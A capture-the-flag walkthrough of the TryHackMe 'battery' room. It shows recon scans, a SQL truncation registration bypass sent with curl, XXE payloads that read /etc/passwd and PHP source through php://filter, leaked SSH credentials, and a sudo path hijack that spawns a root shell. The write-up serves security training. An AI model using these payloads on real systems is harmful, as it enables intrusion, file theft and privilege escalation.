# [battery](https://tryhackme.com/room/battery)

## CTF designed by CTF lover for CTF lovers

Electricity bill portal has been hacked many times in the past, so we have fired one of the employee from the security team, As a new recruit you need to work like a hacker to find the loop holes in the portal and gain root access to the server.

### Base Flag:

1. Start with a full port scan to see what's exposed.

```bash
nmap -sV -p- 10.112.187.193
```

Results:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Directory brute-force. A first pass with a plain wordlist and no extensions only turns up static files, which makes the site look like a dead end at first. Re-running with PHP extensions included is what actually uncovers the real web application.

```bash
feroxbuster -u http://10.112.187.193 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -C 404
```

Results:

```
403      GET       10l       30w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l       57w      406c http://10.112.187.193/
200      GET       25l       56w      663c http://10.112.187.193/admin.php
200      GET       27l       61w      715c http://10.112.187.193/register.php
301      GET        9l       28w      317c http://10.112.187.193/scripts => http://10.112.187.193/scripts/
200      GET       21l      131w    18602c http://10.112.187.193/report
200      GET       24l       57w      406c http://10.112.187.193/index.html
200      GET       39l      118w     1236c http://10.112.187.193/scripts/jquery-mobilemenu.min.js
200      GET      112l      193w     2334c http://10.112.187.193/forms.php
302      GET       55l       86w      908c http://10.112.187.193/dashboard.php => admin.php
200      GET       66l      110w     1104c http://10.112.187.193/acc.php
302      GET        0l        0w        0c http://10.112.187.193/logout.php => admin.php
200      GET      152l     1205w    70843c http://10.112.187.193/scripts/jquery.min.js
200      GET        4l     1202w    93068c http://10.112.187.193/scripts/jquery.1.9.0.min.js
302      GET       72l      129w     1399c http://10.112.187.193/tra.php => admin.php
302      GET       70l      119w     1259c http://10.112.187.193/with.php => admin.php
302      GET       70l      119w     1258c http://10.112.187.193/depo.php => admin.php
200      GET        1l        1w        5c http://10.112.187.193/scripts/ie/index.html
301      GET        9l       28w      320c http://10.112.187.193/scripts/ie => http://10.112.187.193/scripts/ie/
[####################] - 14m  1764452/1764452 0s      found:18      errors:0
[####################] - 14m   882184/882184  1056/s  http://10.112.187.193/
[####################] - 3s    882184/882184  336711/s http://10.112.187.193/scripts/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 14m   882184/882184  1057/s  http://10.112.187.193/scripts/ie/
```

This is the real map of the app: a login page, a registration page, a dashboard, and several banking-flavoured pages that all redirect to login when unauthenticated. Two pages load without redirecting even though they should require auth: `acc.php` and `forms.php`. Those two matter later.

3. Download the binary at `http://10.112.187.193/report`. It isn't part of the web app itself, it's a standalone ELF served as a static file.

4. Run `strings` on it before reaching for a disassembler. This alone gives most of what's needed.

```bash
strings report
```

Two strings stand out because of what sits next to them: `guest` sits right beside `Welcome Guest`, and `admin@bank.a` sits right beside `Password Updated Successfully!` and `Sorry you can't update the password`. That's enough to try both directly against the running binary, rather than jumping straight to disassembly.

Running the binary and logging in with `guest` / `guest` works, confirming the first guess:

```
UserName : guest
Password : guest
Welcome Guest
```

The menu has five options: check users, add user, delete user, change password, and exit. "Check users" just prints a static list of fake bank emails. "Change password" asks for an old password and a new one; entering `admin@bank.a` as the old password returns `Password Updated Successfully!`, confirming the second guess. The new password value is read but never actually used anywhere, so this function's only real purpose is disclosing the secret string through the comparison.

5. To confirm exactly what these two strings are, rather than relying on where `strings` happened to place them, dump the `.rodata` section directly. This is the ELF section where the compiler puts string literals, so once the disassembly shows an address being referenced, `.rodata` is where to look to resolve it.

```bash
objdump -s -j .rodata report
```

Results:

```
report:     file format elf64-x86-64

Contents of section .rodata:
 2000 01000200 00000000 61646d69 6e406261  ........admin@ba
 2010 6e6b2e61 00000000 50617373 776f7264  nk.a....Password
 2020 20557064 61746564 20537563 63657373   Updated Success
 2030 66756c6c 79210a00 536f7272 7920796f  fully!..Sorry yo
 2040 75206361 6e277420 75706461 74652074  u can't update t
 2050 68652070 61737377 6f72640a 0057656c  he password..Wel
 2060 636f6d65 20477565 73740a00 00000000  come Guest......
 2070 3d3d3d3d 3d3d3d3d 3d3d3d3d 3d3d3d3d  ================
 2080 3d3d3d41 7661696c 61626c65 204f7074  ===Available Opt
 2090 696f6e73 3d3d3d3d 3d3d3d3d 3d3d3d3d  ions============
 20a0 3d3d0a00 312e2043 6865636b 20757365  ==..1. Check use
 20b0 72730032 2e204164 64207573 65720033  rs.2. Add user.3
 20c0 2e204465 6c657465 20757365 7200342e  . Delete user.4.
 20d0 20636861 6e676520 70617373 776f7264   change password
 20e0 00352e20 45786974 00636c65 61720000  .5. Exit.clear..
 20f0 0a3d3d3d 3d3d3d3d 3d3d3d3d 3d3d3d3d  .===============
 2100 4c697374 206f6620 61637469 76652075  List of active u
 2110 73657273 3d3d3d3d 3d3d3d3d 3d3d3d3d  sers============
 2120 3d3d3d3d 00737570 706f7274 4062616e  ====.support@ban
 2130 6b2e6100 636f6e74 61637440 62616e6b  k.a.contact@bank
 2140 2e610063 79626572 4062616e 6b2e6100  .a.cyber@bank.a.
 2150 61646d69 6e734062 616e6b2e 61007361  admins@bank.a.sa
 2160 6d406261 6e6b2e61 0061646d 696e3040  m@bank.a.admin0@
 2170 62616e6b 2e610073 75706572 5f757365  bank.a.super_use
 2180 72406261 6e6b2e61 00636f6e 74726f6c  r@bank.a.control
 2190 5f61646d 696e4062 616e6b2e 61006974  _admin@bank.a.it
 21a0 5f61646d 696e4062 616e6b2e 610a0a00  _admin@bank.a...
 21b0 0a0a0a00 00000000 57656c63 6f6d6520  ........Welcome
 21c0 546f2041 42432044 45462042 616e6b20  To ABC DEF Bank
 21d0 4d616e61 67656d65 74205379 7374656d  Managemet System
 21e0 210a0a00 55736572 4e616d65 203a2000  !...UserName : .
 21f0 2573000a 00506173 73776f72 64203a20  %s...Password :
 2200 00677565 73740059 6f757220 43686f69  .guest.Your Choi
 2210 6365203a 20002564 00656d61 696c203a  ce : .%d.email :
 2220 20000000 00000000 6e6f7420 61766169   .......not avai
 2230 6c61626c 6520666f 72206775 65737420  lable for guest
 2240 6163636f 756e740a 0057726f 6e67206f  account..Wrong o
 2250 7074696f 6e0a0057 726f6e67 20757365  ption..Wrong use
 2260 726e616d 65206f72 20706173 73776f72  rname or passwor
 2270 6400                                 d.
```

Address `0x2201` is `guest`, used as the login credential. Address `0x2008` is `admin@bank.a`, used as the password-change target. Nothing else in the binary's disassembly changes this result, so there's no real need to go further into `objdump -d`. The one thing that carries forward from the whole binary is the string `admin@bank.a`.

6. `admin@bank.a` looks like a web-app username rather than anything SSH-related, so the next step is checking it against the login form at `admin.php`. Comparing the two forms shows a length mismatch that turns into the actual vulnerability.

`admin@bank.a` is exactly 12 characters, the same as `register.php`'s limit, so a normal registration can't add anything past it. `admin.php` accepts 14. That two-character gap is what makes a SQL truncation attack possible: if the backend database column is narrower than what the login form accepts, a username submitted with extra characters can get silently truncated on insert. The plan is to register a 14-character username where the first 12 characters are `admin@bank.a`, hoping the database truncates it down to exactly the real admin account's username on storage, while the registration's own uniqueness check only ever sees the full 14-character string and lets it through.

The `maxlength` attribute is enforced by the browser only, not the server, so it's bypassed simply by sending the POST request directly instead of going through the rendered form.

7. The app has a server-side filter that specifically watches for this attack. Three tests establish what the filter actually checks before landing on a working bypass.

Padding with two trailing spaces is blocked:

```bash
curl -s -X POST http://10.112.187.193/register.php \
  --data-urlencode 'uname=admin@bank.a  ' \
  --data-urlencode 'bank=ABC' \
  --data-urlencode 'password=Password123' \
  --data-urlencode 'btn=Register me!' \
  -i
```

Response includes `alert('Nope you are wasting your time ;) ')`.

Swapping the case is also blocked, which rules out a simple case-sensitive match:

```bash
curl -s -X POST http://10.112.187.193/register.php \
  --data-urlencode 'uname=Admin@bank.a  ' \
  --data-urlencode 'bank=ABC' \
  --data-urlencode 'password=Password123' \
  --data-urlencode 'btn=Register me!' \
  -i
```

Same rejection. A 14-character username with no relation to admin@bank.a, still padded with trailing spaces, registers without any issue, which rules out a plain length check:

```bash
curl -s -X POST http://10.112.187.193/register.php \
  --data-urlencode 'uname=zzzzzzzzzzzz  ' \
  --data-urlencode 'bank=ABC' \
  --data-urlencode 'password=Password123' \
  --data-urlencode 'btn=Register me!' \
  -i
```

Response includes `alert('Registered successfully!')`. Put together, the filter is doing something along the lines of `trim(strtolower($uname)) === "admin@bank.a"`: it strips whitespace and lowercases before comparing, which is why the first two attempts got caught and this one didn't. Padding with ordinary characters instead of whitespace slips past `trim()` entirely and confirms the theory:

```bash
curl -s -X POST http://10.112.187.193/register.php \
  --data-urlencode 'uname=admin@bank.aXX' \
  --data-urlencode 'bank=ABC' \
  --data-urlencode 'password=Password123' \
  --data-urlencode 'btn=Register me!' \
  -i
```

Response includes `alert('Registered successfully!')`. Whether this creates a second row with a duplicate username, or matches the existing row some other way, isn't something that can be confirmed from outside the server. The login attempt right after confirms it authenticates as `admin@bank.a` regardless.

8. Log in with the real, untruncated 12-character username and the password just set (`admin@bank.a:Password123`).

9. From the dashboard's nav bar, `forms.php` is the page worth focusing on. Fetching it shows the page builds an XML document client-side in JavaScript and posts the raw body to itself:

```javascript
function XMLFunction() {
  var xml =
    "" +
    '<?xml version="1.0" encoding="UTF-8"?>' +
    "<root>" +
    "<name>" +
    $("#name").val() +
    "</name>" +
    "<search>" +
    $("#search").val() +
    "</search>" +
    "</root>";
  var xmlhttp = new XMLHttpRequest();
  xmlhttp.open("POST", "forms.php", true);
  xmlhttp.send(xml);
}
```

This is a strong XXE candidate: raw XML built from user input, posted with no encoding beyond plain string concatenation. Note that the two visible form fields can't be used to inject a `<!DOCTYPE>` declaration, since whatever gets typed there lands after `<root>` has already opened, and a DOCTYPE is only valid before the root element starts. The request has to be built and sent manually instead, either by intercepting the page's own request in Burp and editing it in Repeater, or by sending a raw `fetch()` from the browser console with the session cookie attached.

10. Confirm the XXE works with a small, well-known file first, before targeting anything specific to this app.

```
POST /forms.php HTTP/1.1
Host: 10.112.187.193
Content-Type: text/xml
Cookie: PHPSESSID=561jbgehgv4pofcjpmbr2999l7
Content-Length: 178

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><root><name>test</name><search>&xxe;</search></root>
```

The response reflects whatever was submitted as `<search>`, not `<name>`, so the entity reference needs to go in `<search>` to show up. Doing that returns the full contents of `/etc/passwd` in place of the "account number is not active" message, confirming external entity resolution is enabled and file reads work. This also reveals two real, non-system accounts on the box: `cyber` and `yash`.

11. Read `acc.php`'s PHP source rather than its rendered output, since code inside `<?php ?>` tags never reaches the browser as plain text under normal HTTP. Wrapping the file read in `php://filter/convert.base64-encode` makes PHP return the raw file bytes, base64-encoded, before execution ever touches them.

```
POST /forms.php HTTP/1.1
Host: 10.112.187.193
Content-Type: text/xml
Cookie: PHPSESSID=561jbgehgv4pofcjpmbr2999l7
Content-Length: 184
Connection: keep-alive

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=acc.php"> ]><root><name>test</name><search>&xxe;</search></root>
```

The response is a base64 blob. Decode it.

12. The decoded source explains why `acc.php` looked like a dead end when it was tested directly earlier: it only lets the literal commands `id` and `whoami` reach `system()`, and destroys the session on anything else. It also contains a hardcoded comment left behind by the developer:

```php
//MY CREDS :- cyber:super#secure&password!
```

That's an SSH credential for a real account on the box.

13. SSH in as `cyber`.

```bash
ssh cyber@10.112.187.193
# Password: super#secure&password!
```

14. The base flag is sitting right in the home directory.

```bash
cat flag1.txt
```

<img width="408" height="127" alt="SCREEN01" src="https://github.com/user-attachments/assets/a0660ddf-4d9c-4354-996f-a678047db436" />

---

### User Flag:

1. Check what `cyber` is allowed to run with elevated privileges.

```bash
sudo -l
```

Results:

```
Matching Defaults entries for cyber on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cyber may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/bin/python3 /home/cyber/run.py
```

`cyber` can run `python3` against one specific script path, as root, without a password. Whether this is actually useful depends entirely on whether `run.py` itself can be modified.

2. Check the permissions on the script and on the directory containing it.

```bash
ls -la /home/cyber/run.py
ls -ld /home/cyber
```

Results:

```
-rwx------ 1 root root 349 Nov 15  2020 /home/cyber/run.py
drwx------ 3 cyber cyber 4096 Nov 17  2020 /home/cyber
```

The script itself is root-owned, mode `700`, so `cyber` has no read, write, or execute access to it directly. The directory that contains it, though, is owned by `cyber` with full `rwx`. In Unix, deleting or creating a file is governed by write permission on the parent directory, not by permissions on the file itself. So even with zero access to the file's contents, `cyber` can remove it and put a different file in its place under the same name, and `sudo` will still execute whatever sits at that path as root, since the rule only checks the path string, not the identity or integrity of the file it points to.

3. Replace the script and trigger it through the sudo rule.

```bash
mv /home/cyber/run.py /home/cyber/run.py.bak
cat > /home/cyber/run.py << 'EOF'
import os
os.setuid(0)
os.system("/bin/bash")
EOF
sudo /usr/bin/python3 /home/cyber/run.py
```

This drops straight into a root shell.

4. The user flag turns out to belong to a second account, `yash`, already seen in `/etc/passwd` from the earlier XXE read. As root, its files are readable regardless of ownership.

```bash
ls /home
ls /home/yash/
cat /home/yash/flag2.txt
```

<img width="393" height="115" alt="SCREEN02" src="https://github.com/user-attachments/assets/8aa45767-0cd8-4603-97a9-c86ad160ecfb" />

`yash`'s home directory also contains `emergency.py` and a file named `fernet`, which points to a separate, more deliberate `cyber` to `yash` to `root` chain using Fernet symmetric encryption. This run never needed it, since root was reached directly through the `run.py` sudo misconfiguration.

---

### Root Flag:

1. Already root at this point, from the privilege escalation above. The flag is in the standard location.

```bash
ls /root
cat /root/root.txt
```

<img width="1044" height="447" alt="SCREEN03" src="https://github.com/user-attachments/assets/b1921f0d-4031-425a-a6f5-cd7c11e5d507" />
